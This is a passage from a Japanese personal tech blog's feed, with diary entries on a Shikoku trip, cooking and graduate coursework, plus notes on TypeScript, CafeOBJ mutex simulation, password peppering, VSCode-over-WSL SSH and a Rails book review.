&lt;span style="color:#66d9ef">export&lt;/span> &lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#a6e22e">PasswordForm&lt;/span>: &lt;span style="color:#66d9ef">VFC&lt;/span>&amp;lt;&lt;span style="color:#f92672">Props&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&amp;lt;&lt;/span>&lt;span style="color:#a6e22e">Response&lt;/span>&amp;gt;&lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#f92672">=&lt;/span> ({&lt;span style="color:#a6e22e">onSubmit&lt;/span>}) &lt;span style="color:#f92672">=&amp;gt;&lt;/span> {
&lt;span style="color:#66d9ef">const&lt;/span> [&lt;span style="color:#a6e22e">value&lt;/span>, &lt;span style="color:#a6e22e">setValue&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">useState&lt;/span>&amp;lt;&lt;span style="color:#f92672">string&lt;/span>&amp;gt;(&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&lt;/span>)
&lt;span style="color:#f92672">~~~~&lt;/span>
&amp;lt;&lt;span style="color:#f92672">PasswordForm&lt;/span> &lt;span style="color:#a6e22e">onSubmit&lt;/span>&lt;span style="color:#f92672">=&lt;/span>{(&lt;span style="color:#a6e22e">_password&lt;/span>) &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#a6e22e">fetch&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;https://example.com/&amp;#34;&lt;/span>)}/&amp;gt;
&lt;/code>&lt;/pre>&lt;/div>&lt;p>↑はなんかもっといい感じにPasswordForm呼び出す側で型渡せるようにしたいんだけどうまく思いつかなかった。&lt;/p>
&lt;p>最後に１つだけ誤植？を見つけた。&lt;/p>
&lt;p>246pのコラムに掲載されていたコード&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-typescript" data-lang="typescript">&lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#a6e22e">tag&lt;/span> &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#a6e22e">strings&lt;/span>: &lt;span style="color:#66d9ef">TemplateStringsArray&lt;/span>, ...&lt;span style="color:#a6e22e">placeholders&lt;/span>: &lt;span style="color:#66d9ef">string&lt;/span>[]) &lt;span style="color:#f92672">=&amp;gt;&lt;/span> {
&lt;span style="color:#a6e22e">console&lt;/span>.&lt;span style="color:#a6e22e">log&lt;/span>(&lt;span style="color:#66d9ef">string&lt;/span>) &lt;span style="color:#75715e">// [&amp;#34;\n font-size: &amp;#34;, &amp;#34;;\n font-weight: &amp;#34;, &amp;#34;;\n&amp;#34;]
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#a6e22e">console&lt;/span>.&lt;span style="color:#a6e22e">log&lt;/span>(&lt;span style="color:#a6e22e">placeholders&lt;/span>) &lt;span style="color:#75715e">// [&amp;#34;16px&amp;#34;, &amp;#34;bold&amp;#34;]
&lt;/span>&lt;span style="color:#75715e">&lt;/span>}
&lt;span style="color:#a6e22e">tag&lt;/span>&lt;span style="color:#e6db74">`
&lt;/span>&lt;span style="color:#e6db74"> font-size: &lt;/span>&lt;span style="color:#e6db74">${&lt;/span>&lt;span style="color:#e6db74">&amp;#39;10px&amp;#39;&lt;/span>&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74">;
&lt;/span>&lt;span style="color:#e6db74"> font-weight: &lt;/span>&lt;span style="color:#e6db74">${&lt;/span>&lt;span style="color:#e6db74">&amp;#39;bold&amp;#39;&lt;/span>&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74">;
&lt;/span>&lt;span style="color:#e6db74">`&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>多分10pxか16pxのどちらかが間違っている。そのうち報告するかもしれない。&lt;/p></description></item><item><title>20220808</title><link>https://qwyng.dev/posts/20220808/</link><pubDate>Mon, 08 Aug 2022 20:18:57 +0900</pubDate><guid>https://qwyng.dev/posts/20220808/</guid><description>&lt;h3 id="やったこと">やったこと
&lt;span>&lt;a href="#%e3%82%84%e3%81%a3%e3%81%9f%e3%81%93%e3%81%a8">#&lt;/a>&lt;/span>
&lt;/h3>&lt;p>腐敗オートミールによって完全にパンドラの箱と化した電子レンジを回収業者様に回収してもらった。三年間本当にありがとう。
他はお家掃除したりオーブンレンジを使い倒したりしていた。&lt;/p>
&lt;p>↓は味噌ダレに一晩つけた鶏もも肉をスチーム加熱したもの。
&lt;img src="https://github.com/QWYNG/images/blob/40702868bead876364ddb845a1ee546a25a78991/FZmfqlFUUAApnoL.jpg?raw=true" alt="">&lt;/p>
&lt;p>電子レンジなのに焦げ目がついていてすごい。&lt;/p>
&lt;h3 id="学び">学び
&lt;span>&lt;a href="#%e5%ad%a6%e3%81%b3">#&lt;/a>&lt;/span>
&lt;/h3>&lt;p>昨日に引き続き手を動かして学ぶTypeScriptを読み進めていて、四章まで読み終えた。assert functionのコンパイラと対話してる感すごい。
&lt;a href="https://www.typescriptlang.org/docs/handbook/release-notes/typescript-3-7.html#assertion-functions">TypeScriptのドキュメント&lt;/a>を読むと、もともとJavaScriptでよく使われていたassertをそのまま型のある世界でも活かせるようにしたいというのがこの機能の目的らしい。&lt;/p>
&lt;p>後友達にアジャイルサムライという本をおすすめされたので読んでいくぞ。&lt;/p></description></item><item><title>20220807</title><link>https://qwyng.dev/posts/20220807/</link><pubDate>Sun, 07 Aug 2022 21:56:42 +0900</pubDate><guid>https://qwyng.dev/posts/20220807/</guid><description>&lt;h3 id="やったこと">やったこと
&lt;span>&lt;a href="#%e3%82%84%e3%81%a3%e3%81%9f%e3%81%93%e3%81%a8">#&lt;/a>&lt;/span>
&lt;/h3>&lt;p>大学院講義の課題の８月前半締め切りのものを終わらせた。気持ちE。
後電子レンジを買い替えた。&lt;/p>
&lt;blockquote class="twitter-tweet">&lt;p lang="und" dir="ltr">mng... &lt;a href="https://t.co/qC4x9Misf4">pic.twitter.com/qC4x9Misf4&lt;/a>&lt;/p>&amp;mdash; とるめん (@qwyngg) &lt;a href="https://twitter.com/qwyngg/status/1556168774859890688?ref_src=twsrc%5Etfw">August 7, 2022&lt;/a>&lt;/blockquote> &lt;script async src="https://platform.twitter.com/widgets.js" charset="utf-8">&lt;/script>
&lt;p>&lt;a href="https://www.amazon.co.jp/gp/product/B09KBNHH3M">https://www.amazon.co.jp/gp/product/B09KBNHH3M&lt;/a>&lt;/p>
&lt;p>正直掃除が楽なフラットテーブルで自宅の冷蔵庫の上に乗れば何でも良かった。&lt;/p>
&lt;p>多分ほとんどオーブン使うことはないんだけど2 in 1の誘惑に負けてしまった。&lt;/p>
&lt;p>明日はオーブン機能をつかって鳥の照り焼きをつくります。減価償却駆動人生。&lt;/p>
&lt;h3 id="学び">学び
&lt;span>&lt;a href="#%e5%ad%a6%e3%81%b3">#&lt;/a>&lt;/span>
&lt;/h3>&lt;p>今までもちょこちょこ読んでいた&lt;a href="https://www.c-r.com/book/detail/1429">手を動かして学ぶTypeScript&lt;/a>を四章の途中まで読み進めた。
コンパイルの気持ちを考えて書くのは前にScalaやRustを少しやってた時にも体験したが、TypeScriptの世界ではより型によって人間のミスを防ごうという気持ちがつよそうだなと感じた。本書でもライブラリは型の情報から見ていけとか人間がやりそうなミスをいかに型で防ぐかみたいなことが書かれていた。
型がない言語に型足したわけだしドキュメントや仕様としての型になるのはそれはそう。型がしっかりしているとRubyみたいに「たぶんこうやろ」みたいな雰囲気で書く必要なく気持ちいいのはわかる。
後JSの世界ってEventListernerがあるからか関数をリレーしていくコードがめちゃ多い。そりゃHaskellに流れる人もいますわ。
後は組み込みのイテレーション操作をもっと増やしてほしい。書くのが面倒なので。&lt;/p></description></item><item><title>20220806</title><link>https://qwyng.dev/posts/20220806/</link><pubDate>Sat, 06 Aug 2022 23:33:02 +0900</pubDate><guid>https://qwyng.dev/posts/20220806/</guid><description>&lt;h3 id="今日やったこと">今日やったこと
&lt;span>&lt;a href="#%e4%bb%8a%e6%97%a5%e3%82%84%e3%81%a3%e3%81%9f%e3%81%93%e3%81%a8">#&lt;/a>&lt;/span>
&lt;/h3>&lt;p>大学院の宿題をやった。今日はサービスサイエンスという文系より？（正しくいうと社会科学より）の講義のレポートをやっていた。 オンライン化された対面サービスの例ってなに？と友達と相談しながらレポートできたのが良かった。&lt;/p>
&lt;h3 id="学び">学び
&lt;span>&lt;a href="#%e5%ad%a6%e3%81%b3">#&lt;/a>&lt;/span>
&lt;/h3>&lt;p>LISPではネストしたリストをS式というらしい。という話を友だちとしていた。
プログラミング言語の構文木と同じような構造というイメージ。
XMLと似ているといわるのも納得。&lt;/p>
&lt;p>&lt;a href="https://ja.wikipedia.org/wiki/S%E5%BC%8F">https://ja.wikipedia.org/wiki/S%E5%BC%8F&lt;/a>&lt;/p></description></item><item><title>20220805</title><link>https://qwyng.dev/posts/20220805/</link><pubDate>Fri, 05 Aug 2022 23:32:52 +0900</pubDate><guid>https://qwyng.dev/posts/20220805/</guid><description>&lt;h3 id="やったこと">やったこと
&lt;span>&lt;a href="#%e3%82%84%e3%81%a3%e3%81%9f%e3%81%93%e3%81%a8">#&lt;/a>&lt;/span>
&lt;/h3>&lt;p>引き続き大学院の課題をやっていた。機能は無限リストでのMutexシミュレーターの実装だったが今回はMultiSetでのMutexシミュレーターの実装をやった。
MultiSet、RubyでいうSetなのだが、内部でHashを使ってるRubyしかり意外とMultiSetをそのまま実装されている言語は少ないらしい。&lt;/p>
&lt;h3 id="学び">学び
&lt;span>&lt;a href="#%e5%ad%a6%e3%81%b3">#&lt;/a>&lt;/span>
&lt;/h3>&lt;p>V3がLJLで初勝利した。負けてる側が勝つことで生まれる感情があること学んだ。
俺もLOL頑張るぞ！&lt;/p></description></item><item><title>日記 20220804</title><link>https://qwyng.dev/posts/20220804/</link><pubDate>Thu, 04 Aug 2022 22:13:06 +0900</pubDate><guid>https://qwyng.dev/posts/20220804/</guid><description>&lt;h3 id="やったこと">やったこと
&lt;span>&lt;a href="#%e3%82%84%e3%81%a3%e3%81%9f%e3%81%93%e3%81%a8">#&lt;/a>&lt;/span>
&lt;/h3>&lt;h3 id="大学院の講義の課題">大学院の講義の課題
&lt;span>&lt;a href="#%e5%a4%a7%e5%ad%a6%e9%99%a2%e3%81%ae%e8%ac%9b%e7%be%a9%e3%81%ae%e8%aa%b2%e9%a1%8c">#&lt;/a>&lt;/span>
&lt;/h3>&lt;p>cafeobjでMutexプロトコルの動作のシミュレーターを作った。
字面だけ聞くと凄そうだが以下の様に全部丁寧な手作り状態遷移という感じ。
lockedの操作もAtomicなものではない。
全てのプロセスは共有リソースを使わないRemainder Sectionとロックの値を変更するModifying Sectionと共有リソースを使うCritical Sectionの３つの状態を遷移し、Critical Sectionなプロセスは同時に１つしかありえないという当たり前といば当たり前なプロトコルがMutexである。（ハズ&amp;hellip;)
cafeobjという代数仕様言語で実際に記述することで、Mutexに対する脳内等式推論が少し体験できた。&lt;/p>
&lt;pre tabindex="0">&lt;code>eq trans((locked: true,pc1: rs, pc2: L2, pc3: L3, pc4: L4),t1)
= (locked: true,pc1: rs, pc2: L2, pc3: L3, pc4: L4) .
eq trans((locked: false,pc1: rs,pc2: L2, pc3: L3, pc4: L4),t1)
= (locked: false,pc1: ms,pc2: L2, pc3: L3, pc4: L4) .
eq trans((locked: B,pc1: ms, pc2: L2, pc3: L3, pc4: L4),t1)
= (locked: true,pc1: cs, pc2: L2, pc3: L3, pc4: L4) .
eq trans((locked: B,pc1: cs, pc2: L2, pc3: L3, pc4: L4),t1)
= (locked: false,pc1: rs,pc2: L2, pc3: L3, pc4: L4) .
&lt;/code>&lt;/pre>&lt;h3 id="学び">学び
&lt;span>&lt;a href="#%e5%ad%a6%e3%81%b3">#&lt;/a>&lt;/span>
&lt;/h3>&lt;h3 id="読書">読書
&lt;span>&lt;a href="#%e8%aa%ad%e6%9b%b8">#&lt;/a>&lt;/span>
&lt;/h3>&lt;p>数学的考え方が全然できないので、&lt;a href="https://gihyo.jp/book/2022/978-4-297-12521-9">問題解決のための「アルゴリズム×数学」が基礎からしっかり身につく本&lt;/a>を読んでいる。&lt;/p>
&lt;p>今日は包除原理を具体的にコードにした。
&lt;a href="https://atcoder.jp/contests/math-and-algorithm/submissions/33768538">実際の提出コード&lt;/a>&lt;/p>
&lt;p>要は&lt;/p>
&lt;pre tabindex="0">&lt;code>|P∪Q| = |P| + |Q| - |P∩Q|
&lt;/code>&lt;/pre>&lt;p>なので理解が難しい原理というわけではないが、この原理が問題に使えると気づくのはできないんだよな&amp;hellip;
後Google日本語入力で「わしゅうごう」で変換すると&lt;code>∪&lt;/code>、「せきしゅうごう」で変換すると&lt;code>∩&lt;/code>が出てきて気分が良かった。&lt;/p></description></item><item><title>日記 20220803</title><link>https://qwyng.dev/posts/20220803/</link><pubDate>Wed, 03 Aug 2022 22:57:03 +0900</pubDate><guid>https://qwyng.dev/posts/20220803/</guid><description>&lt;h2 id="四国旅行">四国旅行
&lt;span>&lt;a href="#%e5%9b%9b%e5%9b%bd%e6%97%85%e8%a1%8c">#&lt;/a>&lt;/span>
&lt;/h2>&lt;p>東京に帰ってきた！&lt;br>
本当に色々あったんだけどとりあえず四国は良かった。道後温泉は足湯以外はしょぼめだった。
愛媛はみかんと出汁が板。&lt;br>
おもしろエピソードが5個くらい増えた。&lt;/p>
&lt;h2 id="学び">学び
&lt;span>&lt;a href="#%e5%ad%a6%e3%81%b3">#&lt;/a>&lt;/span>
&lt;/h2>&lt;p>旅行に一緒に行っていた同僚氏から「お土産を手厚くするのが夫婦円満のコツ」ということを学んだ。&lt;br>
僕はお土産を買う相手がいないので道後プリンを一人で食べた。&lt;/p>
&lt;blockquote class="twitter-tweet">&lt;p lang="ja" dir="ltr">足湯withプリン &lt;a href="https://t.co/jsxcROf4ZQ">pic.twitter.com/jsxcROf4ZQ&lt;/a>&lt;/p>&amp;mdash; とるめん (@qwyngg) &lt;a href="https://twitter.com/qwyngg/status/1554668353813225472?ref_src=twsrc%5Etfw">August 3, 2022&lt;/a>&lt;/blockquote> &lt;script async src="https://platform.twitter.com/widgets.js" charset="utf-8">&lt;/script>
帰宅したら電子レンジに腐敗したオートミールが鎮座しており、オチがついてて良かった。
&lt;p>帰りの飛行機の中でカイゼン・ジャーニーという本を読んでいた。&lt;br>
チーム開発でよく見る手法の狙いが色々のってたので、そういった手法の狙いをチームで認識揃えるために使うための本なのかなという感想を持った。&lt;br>
スクラムやアジャイルについては「皆色々意見もっているな」という認識なので、皆で色々やって良いプロダクト作ってじゃんじゃん儲けたいというお気持ちです。&lt;br>
T1&lt;sup id="fnref:1">&lt;a href="#fn:1" class="footnote-ref" role="doc-noteref">1&lt;/a>&lt;/sup>のようになりたいものですね。&lt;/p>
&lt;section class="footnotes" role="doc-endnotes">
&lt;hr>
&lt;ol>
&lt;li id="fn:1" role="doc-endnote">
&lt;p>League of Legendsの最強プロチーム&amp;#160;&lt;a href="#fnref:1" class="footnote-backref" role="doc-backlink">&amp;#x21a9;&amp;#xfe0e;&lt;/a>&lt;/p>
&lt;/li>
&lt;/ol>
&lt;/section></description></item><item><title>日記　20220802</title><link>https://qwyng.dev/posts/20220802/</link><pubDate>Tue, 02 Aug 2022 21:14:10 +0900</pubDate><guid>https://qwyng.dev/posts/20220802/</guid><description>&lt;h2 id="四国旅行">四国旅行
&lt;span>&lt;a href="#%e5%9b%9b%e5%9b%bd%e6%97%85%e8%a1%8c">#&lt;/a>&lt;/span>
&lt;/h2>&lt;p>諸事情により諸が行われた。&lt;/p>
&lt;p>道後温泉の足湯が気持ちよかった。&lt;/p>
&lt;h2 id="学び">学び
&lt;span>&lt;a href="#%e5%ad%a6%e3%81%b3">#&lt;/a>&lt;/span>
&lt;/h2>&lt;p>今日はまじでない。Evi君助けて！&lt;/p></description></item><item><title>日記 2022/08/01</title><link>https://qwyng.dev/posts/20220801/</link><pubDate>Mon, 01 Aug 2022 20:59:29 +0900</pubDate><guid>https://qwyng.dev/posts/20220801/</guid><description>&lt;p>日記！&lt;/p>
&lt;h2 id="四国旅行">四国旅行
&lt;span>&lt;a href="#%e5%9b%9b%e5%9b%bd%e6%97%85%e8%a1%8c">#&lt;/a>&lt;/span>
&lt;/h2>&lt;p>高知市のホテルで目を覚まし、電車でかずら橋へ向かった。&lt;/p>
&lt;blockquote class="twitter-tweet">&lt;p lang="ja" dir="ltr">マジでグラグラしてて怖かった… &lt;a href="https://t.co/M7L11g00mH">pic.twitter.com/M7L11g00mH&lt;/a>&lt;/p>&amp;mdash; とるめん (@qwyngg) &lt;a href="https://twitter.com/qwyngg/status/1553970868216164352?ref_src=twsrc%5Etfw">August 1, 2022&lt;/a>&lt;/blockquote> &lt;script async src="https://platform.twitter.com/widgets.js" charset="utf-8">&lt;/script>
&lt;p>歩くたびに揺れるし足場の感覚広いしで本当に怖かった。&lt;br>
とはいえ景色があまりに夏休みすぎて最高だった。僕たちの夏はこれからだ。&lt;br>
夕食では寿司を食べた。あまりに美味しすぎて虹がかかった。&lt;/p>
&lt;blockquote class="twitter-tweet">&lt;p lang="ja" dir="ltr">人生　最高　高み　幸福　桃源郷　喜び　涙　跳躍　一筋の希望　虹 &lt;a href="https://t.co/CeCDe5I7rM">pic.twitter.com/CeCDe5I7rM&lt;/a>&lt;/p>&amp;mdash; とるめん (@qwyngg) &lt;a href="https://twitter.com/qwyngg/status/1554051698078781440?ref_src=twsrc%5Etfw">August 1, 2022&lt;/a>&lt;/blockquote> &lt;script async src="https://platform.twitter.com/widgets.js" charset="utf-8">&lt;/script>
&lt;h2 id="学び">学び
&lt;span>&lt;a href="#%e5%ad%a6%e3%81%b3">#&lt;/a>&lt;/span>
&lt;/h2>&lt;p>四国在住の方に奇跡のオフ会に誘っていただいたので、お会いする方繋がりでSMTPの書籍読んだりRailsの認証のスライドをみたりしていた。&lt;/p>
&lt;p>&lt;a href="https://cryptic-command.booth.pm/items/1136808">【電子版】Dark Depths of SMTP&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://speakerdeck.com/sylph01/build-and-learn-rails-authentication">Build and Learn Rails Authentication&lt;/a>&lt;/p>
&lt;p>特にPepperとSaltの違いが自分の中では勉強になった。DevisePepperとかいうアレはSaltとは違うものだったらしい。 &lt;br>
そもそもPepperがSaltと違うものだという認識がなく、Saltは秘密にする値だという意識を持っていた。&lt;br>
bcryptでは出力される文字列にはSaltがそのまま載っている仕様なので、自分がbcryptの仕様をよくわかっていなかったことが判明した。&lt;br>
PepperはSecretSaltとも呼ばれており、データベース以外の場所（データベースの中身が漏洩した時に同時に流出する可能性が低い場所）に秘密の値を保存しておき、この値をパスワードをハッシュ化する時に用いるのがPepperという手法らしい。&lt;br>
この手法を用いることで仮にハッシュ化したパスワードが全て漏洩してとしても、辞書攻撃を防くことができる。&lt;br>
Pepperをハッシュ化されたパスワードの暗号化の秘密鍵として使う手法もあるようだ。&lt;/p>
&lt;h3 id="参考">参考
&lt;span>&lt;a href="#%e5%8f%82%e8%80%83">#&lt;/a>&lt;/span>
&lt;/h3>&lt;p>&lt;a href="https://en.wikipedia.org/wiki/Pepper_(cryptography)">https://en.wikipedia.org/wiki/Pepper_(cryptography)&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://dropbox.tech/security/how-dropbox-securely-stores-your-passwords">How Dropbox securely stores your passwords&lt;/a>&lt;/p></description></item><item><title>日記 2022/07/31</title><link>https://qwyng.dev/posts/20220731/</link><pubDate>Sun, 31 Jul 2022 22:31:04 +0900</pubDate><guid>https://qwyng.dev/posts/20220731/</guid><description>&lt;p>日記&lt;/p>
&lt;h2 id="四国旅行">四国旅行
&lt;span>&lt;a href="#%e5%9b%9b%e5%9b%bd%e6%97%85%e8%a1%8c">#&lt;/a>&lt;/span>
&lt;/h2>&lt;p>香川県高松市でうどんを食べた。出汁が薄味でOC。&lt;/p>
&lt;blockquote class="twitter-tweet">&lt;p lang="ja" dir="ltr">香川 &lt;a href="https://t.co/fvUV25gtJM">pic.twitter.com/fvUV25gtJM&lt;/a>&lt;/p>&amp;mdash; とるめん (@qwyngg) &lt;a href="https://twitter.com/qwyngg/status/1553573467441664000?ref_src=twsrc%5Etfw">July 31, 2022&lt;/a>&lt;/blockquote> &lt;script async src="https://platform.twitter.com/widgets.js" charset="utf-8">&lt;/script>
栗林公園で川下りしたり写真撮ったりした。
&lt;blockquote class="twitter-tweet">&lt;p lang="ja" dir="ltr">なんか乗ってます &lt;a href="https://t.co/VlGo9ai45W">pic.twitter.com/VlGo9ai45W&lt;/a>&lt;/p>&amp;mdash; とるめん (@qwyngg) &lt;a href="https://twitter.com/qwyngg/status/1553599164579078145?ref_src=twsrc%5Etfw">July 31, 2022&lt;/a>&lt;/blockquote> &lt;script async src="https://platform.twitter.com/widgets.js" charset="utf-8">&lt;/script>
&lt;blockquote class="twitter-tweet">&lt;p lang="ja" dir="ltr">栗林公園の高台からのパノラマ！ &lt;a href="https://t.co/dIQyfsh0h2">pic.twitter.com/dIQyfsh0h2&lt;/a>&lt;/p>&amp;mdash; とるめん (@qwyngg) &lt;a href="https://twitter.com/qwyngg/status/1553616985648295942?ref_src=twsrc%5Etfw">July 31, 2022&lt;/a>&lt;/blockquote> &lt;script async src="https://platform.twitter.com/widgets.js" charset="utf-8">&lt;/script>
&lt;p>夜は高知で鰹のたたきを楽しんだ。&lt;/p>
&lt;h2 id="学び">学び
&lt;span>&lt;a href="#%e5%ad%a6%e3%81%b3">#&lt;/a>&lt;/span>
&lt;/h2>&lt;blockquote class="twitter-tweet">&lt;p lang="ja" dir="ltr">二度と23時に骨付鳥食べない&lt;/p>&amp;mdash; とるめん (@qwyngg) &lt;a href="https://twitter.com/qwyngg/status/1553552376107188225?ref_src=twsrc%5Etfw">July 31, 2022&lt;/a>&lt;/blockquote> &lt;script async src="https://platform.twitter.com/widgets.js" charset="utf-8">&lt;/script>
&lt;p>前日、暴飲暴食が祟りホテルのベッドで胃の中が大荒れになっていた。&lt;br>
渦潮を見る前に自分の胃の中で渦潮を起こす事になるとは思っていなかったが、とにかく辛くて全く睡眠が取れず、今日をバッドコンディションで過ごすことになってしまった。&lt;br>
もう夜寝る前に暴飲暴食して取り返しがつく年齢じゃなくなっていることを学んだ。&lt;/p></description></item><item><title>2022/07/30</title><link>https://qwyng.dev/posts/20220730/</link><pubDate>Sat, 30 Jul 2022 23:02:49 +0900</pubDate><guid>https://qwyng.dev/posts/20220730/</guid><description>&lt;p>今日から暫くおやすみなので日記をつけていく&lt;/p>
&lt;h2 id="四国旅行">四国旅行
&lt;span>&lt;a href="#%e5%9b%9b%e5%9b%bd%e6%97%85%e8%a1%8c">#&lt;/a>&lt;/span>
&lt;/h2>&lt;p>四国に旅行にでかけた。初日は徳島ラーメンと高松市の骨付き肉を食べた。うまかったので131831823点。&lt;/p>
&lt;h2 id="学び">学び
&lt;span>&lt;a href="#%e5%ad%a6%e3%81%b3">#&lt;/a>&lt;/span>
&lt;/h2>&lt;p>最近プログラミング言語の意味論の研究のために論理学を学びたくなったので&lt;a href="https://www.iwanami.co.jp/book/b496835.html">まったくゼロからの論理学&lt;/a>を読んでいる。&lt;br>
今日読んでいて面白かったのは全称命題とその反対は同時に成り立つ可能性があるということ、つまり
&lt;code>全てのエンジニアはゲーマーである&lt;/code>
と
&lt;code>全てのエンジニアはゲーマーでない&lt;/code>
が両方とも真になることがありうるということ。&lt;/p>
&lt;p>&lt;code>全てのエンジニアはゲーマーである&lt;/code>
から
&lt;code>それゆえエンジニアは存在する&lt;/code>
は正しい演繹ではないので、&lt;code>全てのエンジニアはゲーマーである&lt;/code>というのはエンジニアが空集合であるというのも含まれている。論理学における全称では空集合も含んでいることを学んだ。&lt;/p>
&lt;p>&lt;code>全てのエンジニアはゲーマーである&lt;/code>
と
&lt;code>全てのエンジニアはゲーマーでない&lt;/code>
が真だとして、エンジニアが存在すると仮定すると矛盾することになるので、エンジニアは存在しないことになる。エンジニアが存在しないならば命題はどちらも真となる。&lt;/p>
&lt;h2 id="明日">明日
&lt;span>&lt;a href="#%e6%98%8e%e6%97%a5">#&lt;/a>&lt;/span>
&lt;/h2>&lt;p>高知にいって鰹食べるぞo(^-^)o&lt;/p></description></item><item><title>WSLのSSH設定を使ってWindows内のVSCodeからSSHする</title><link>https://qwyng.dev/posts/20220724/</link><pubDate>Sun, 24 Jul 2022 20:17:12 +0900</pubDate><guid>https://qwyng.dev/posts/20220724/</guid><description>&lt;h2 id="困っていたこと">困っていたこと
&lt;span>&lt;a href="#%e5%9b%b0%e3%81%a3%e3%81%a6%e3%81%84%e3%81%9f%e3%81%93%e3%81%a8">#&lt;/a>&lt;/span>
&lt;/h2>&lt;p>今年の４月から大学のオフライン講義が始まった。&lt;br>
その中でラップトップをキャンパスに持っていきつつ、宿題や予習等はゲーム用にスペックもりもりにしたWindowsPCで行いたいという欲求が発生した。&lt;br>
WindowsPCを常時起動しておくのは電気代的に避けたかったので、クラウド環境にインスタンスを立ててラップトップもWindowsもその中で開発するという方法をとることにした。&lt;/p>
&lt;p>Windows内のWSLからgcpに立てたcompute engineのインスタンスに接続しようと思ったのだが、VSCode自体はWindowsの世界のソフトウェアなのでVSCodeにsshさせようとするとWindows内のssh設定を使わなければならなかった。&lt;br>
交換鍵ペアを作ったりgcloud cliを使うのにWindowsを直接扱うのは面倒だったので、なんとかVSCodeにWSL内のssh設定を使わせたかった。&lt;/p>
&lt;h2 id="解決方法">解決方法
&lt;span>&lt;a href="#%e8%a7%a3%e6%b1%ba%e6%96%b9%e6%b3%95">#&lt;/a>&lt;/span>
&lt;/h2>&lt;p>同じことに困っていた人がいた。&lt;br>
&lt;a href="https://qiita.com/tksmatsubara/items/0b2d675cd663fbfc0cad">https://qiita.com/tksmatsubara/items/0b2d675cd663fbfc0cad&lt;/a>
&lt;a href="https://github.com/microsoft/vscode-remote-release/issues/937">https://github.com/microsoft/vscode-remote-release/issues/937&lt;/a>&lt;br>
&lt;code>C:\Windows\system32\wsl.exe ssh&lt;/code>に処理を投げるっぽいスクリプトを作成して、そのスクリプトへのパスをVSCodeの&lt;code>remote.SSH.path&lt;/code>に設定することで解決した。&lt;br>
標準入力はWindowsOSのままなのかssh時にknown_hosts違いの入力要求をVSCode上で入力してもWSLのプロセスまでは届かなかった。&lt;br>
&lt;img src="https://github.com/QWYNG/images/raw/main/%E3%82%B9%E3%82%AF%E3%83%AA%E3%83%BC%E3%83%B3%E3%82%B7%E3%83%A7%E3%83%83%E3%83%88%202022-07-24%20201949.png" alt="">
一度WSL内からsshするなりして入力が求められない状態をつくっておくといいだろう。&lt;/p>
&lt;h2 id="感想">感想
&lt;span>&lt;a href="#%e6%84%9f%e6%83%b3">#&lt;/a>&lt;/span>
&lt;/h2>&lt;p>VSCodeなのかVScodeなのかわからない。&lt;/p></description></item><item><title>Sustainable Web Development with Ruby on Railsを読んだ</title><link>https://qwyng.dev/posts/20220526/</link><pubDate>Sun, 29 May 2022 21:17:12 +0900</pubDate><guid>https://qwyng.dev/posts/20220526/</guid><description>&lt;p>大好評発売中&lt;a href="https://sustainable-rails.com/">Sustainable Web Development with Ruby on Rails&lt;/a>を読んだ。
&lt;a href="https://r7kamura.com/articles/2022-05-24-sustainable-rails">r7kamuraさんの記事&lt;/a>の流れっぽく気になったところを書いていく。&lt;/p>
&lt;h2 id="using-the-environment-for-runtime-configuration">Using The Environment for Runtime Configuration
&lt;span>&lt;a href="#using-the-environment-for-runtime-configuration">#&lt;/a>&lt;/span>
&lt;/h2>&lt;p>credentials.ymlじゃなくてUNIXの環境変数を使うことを勧めていた。環境の設定は一つの方法で行うべきで、DATABASE_URLとかでもう使われてるんだから環境変数でいいとのこと。
これは「単一の方法であるべき」には賛成で「環境変数で良い」には反対だ。rails6以降credencials.ymlを環境別に用意できるようになったし、レポジトリの中に秘密の文字列を残しておけるのはデプロイしやすさに貢献しないということはないだろう。
ただ環境ごとにいちいちcredentials:editするのは面倒かもしれないし、この本の中でも「コストとリターン考えて決めろ」みたいなことが書かれてるので、チームでしっかり決めるべきなのだろう。&lt;/p>
&lt;h2 id="authorization-and-role-based-access-controls">Authorization and Role-based Access Controls
&lt;span>&lt;a href="#authorization-and-role-based-access-controls">#&lt;/a>&lt;/span>
&lt;/h2>&lt;p>cancancanがおすすめされていて良かった。認可はuserとリソースと操作受け取って、booleanを返すなにかがあると便利。後punditも僕がコミットしたOSSで便利なのでみんな使ってくれよな。&lt;/p>
&lt;h2 id="validations-dont-provide-data-integrity">Validations Don’t Provide Data Integrity
&lt;span>&lt;a href="#validations-dont-provide-data-integrity">#&lt;/a>&lt;/span>
&lt;/h2>&lt;p>賛成。確かにupdate_columnsは公開APIだし、本番のDBに手でSQL書いて実行することもあるのでデータの整合性の保証には使えない。&lt;br>
最近同僚氏ともUniquness Validationの意義について話したことがあった。その結果、DBにuniqがあればいらないのでは？、DBへのアクセスが増えるだけじゃない？と色々デメリットもでたが、「ユーザーにエラーがわかりやすくなる」というメリットがあることがわかった。「エラー処理はバックエンドができるUX向上」という言葉を金言だと思っているのでValidationのエラーメッセージはそれだけで価値があると思っている。&lt;br>
「Validationがユーザーに綺麗なデータを入力させるためのもの。DBの制約は最低限守らなきゃいけないラインを守るためのもの」という言語化は良かった。&lt;/p>
&lt;h2 id="how-to-barely-use-callback--dont-over-use-callbacks">How to (Barely) Use Callback / Don’t Over-use Callbacks
&lt;span>&lt;a href="#how-to-barely-use-callback--dont-over-use-callbacks">#&lt;/a>&lt;/span>
&lt;/h2>&lt;p>賛成。色んな人がCallback辛いと言っているのを聞いてきたしこれからも聞くだろう。&lt;br>
